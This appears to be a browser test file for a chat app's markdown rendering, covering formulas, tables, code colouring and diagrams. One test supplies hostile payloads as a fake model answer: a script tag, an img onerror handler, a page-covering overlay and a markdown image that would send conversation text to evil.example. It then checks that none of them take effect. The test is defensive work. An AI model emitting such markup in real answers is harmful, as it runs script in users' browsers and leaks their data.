// What an answer looks like in a real browser, and what it is kept from doing
// (ADR 0016). The fake model echoes the question, so a test writes the answer it wants
// to see as its question. The first line gets the echo's "Echo: " before it.
import { expect, test } from "./chat";

test("an answer in markdown is formatted: headings, formulas, a table, coloured code", async ({
  chat,
}) => {
  await chat.open();
  await chat.ask(
    [
      "this:",
      "",
      "## Bike parts",
      "",
      "The **saddle** costs $5 and the chain $10. Energy is $E = mc^2$.",
      "",
      "$$x = \\frac{-b}{2a}$$",
      "",
      "| Part | Use |",
      "| --- | --- |",
      "| Tyres | Grip<br>Comfort |",
      "",
      "```python",
      "print('saddle')",
      "```",
    ].join("\n"),
  );
  const answer = chat.answers;

  await expect(
    answer.getByRole("heading", { level: 2, name: "Bike parts" }),
  ).toBeVisible();
  await expect(answer).toContainText("costs $5 and the chain $10");
  // Two formulas, one of them on a line of its own.
  await expect(answer.locator(".katex")).toHaveCount(2);
  await expect(answer.locator(".katex-display")).toHaveCount(1);
  // The one tag that is obeyed, where models write it: a line break in a cell.
  await expect(
    answer.getByRole("cell", { name: "Grip Comfort" }).locator("br"),
  ).toHaveCount(1);
  // The code is there at once, and its colours a moment later.
  await expect(answer.locator("pre")).toContainText("print('saddle')");
  await expect(
    answer.locator('pre span[style*="color"], pre span[style*="--shiki"]'),
  ).not.toHaveCount(0);

  // The question is shown as it was typed.
  await expect(chat.questions).toContainText("## Bike parts");
  await expect(chat.questions.getByRole("heading")).toHaveCount(0);
});

test("an answer can't fetch, run a script or cover the page, and a link asks first", async ({
  chat,
  page,
  context,
  outside,
}) => {
  const link = "https://bank.example/login?from=actio";
  await chat.open();
  await chat.ask(
    [
      "this:",
      "",
      '<img src="https://evil.example/a.png" onerror="window.pwned = 1"> and <script>window.pwned = 2</script>',
      "",
      '<div style="position: fixed; inset: 0; background: red">over everything</div>',
      "",
      "![a chart](https://evil.example/pixel.png?said=everything)",
      "",
      `Read [the bank's page](${link}).`,
    ].join("\n"),
  );
  const answer = chat.answers;
  await expect(answer).toContainText("the bank's page");
  await chat.answered();

  // HTML is shown, not obeyed.
  await expect(answer).toContainText('<img src="https://evil.example/a.png"');
  await expect(answer).toContainText("<script>window.pwned = 2</script>");
  await expect(answer.locator("img, script, [style*='fixed']")).toHaveCount(0);
  expect(await page.evaluate(() => "pwned" in window)).toBe(false);
  // The picture is named, not fetched: nothing has been asked of another site.
  await expect(answer).toContainText("[Image blocked: a chart]");
  expect(outside.asked).toEqual([]);

  // A link shows where it leads before it goes there.
  await answer.getByRole("button", { name: "the bank's page" }).click();
  const dialog = page.locator('[data-streamdown="link-safety-modal"]');
  await expect(dialog).toContainText(link);
  expect(outside.asked).toEqual([]);

  const opening = context.waitForEvent("page");
  await dialog.getByRole("button", { name: "Open link", exact: true }).click();
  const opened = await opening;

  // Only now is the other site asked, in a tab that can't reach back into this one.
  outside.expected = [link];
  await expect.poll(() => outside.asked).toEqual([link]);
  expect(await opened.evaluate(() => window.opener === null)).toBe(true);
});

test("a diagram is drawn", async ({ chat }) => {
  await chat.open();
  await chat.ask(
    [
      "this:",
      "",
      "```mermaid",
      "flowchart TD",
      "  A[Someone asks] --> B[The model answers]",
      "```",
    ].join("\n"),
  );

  // The drawing itself, without the buttons beside it.
  const diagram = chat.answers.locator(
    '[data-streamdown="mermaid"] [role=img]',
  );
  await expect(diagram.locator("svg")).toHaveCount(1);
  await expect(diagram).toContainText("Someone asks");
  await expect(diagram).toContainText("The model answers");
});

test("a diagram with a mistake in it is shown as it was written", async ({
  chat,
}) => {
  await chat.open();
  await chat.ask(
    [
      "this:",
      "",
      "```mermaid",
      "flowchart TD",
      "  A[Ask (once)] --> B",
      "```",
    ].join("\n"),
  );

  await expect(
    chat.answers.getByText("This diagram can't be drawn as it was written."),
  ).toBeVisible();
  await expect(chat.answers.locator("pre")).toContainText(
    "A[Ask (once)] --> B",
  );
});
